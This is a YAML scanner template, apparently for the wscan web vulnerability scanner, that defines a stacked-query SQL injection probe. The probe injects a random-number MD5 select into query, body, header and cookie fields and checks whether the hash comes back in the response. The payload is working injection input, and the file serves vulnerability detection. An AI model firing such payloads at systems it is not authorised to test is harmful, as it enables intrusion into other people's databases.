name: "custom-sqli"


set:
  r1: randomInt(800000000, 1000000000)

payload:
  - " ' and 1=0 ;select md5({{r1}}) --"

placeholder:
  - query
  - body
  - header
  - cookie

expression:  response.body.bcontains(bytes(md5(string(r1))))

detail:
  author: shaochuyu
  links:
    - https://github.com/chushuai/wscan
  version: 1.0
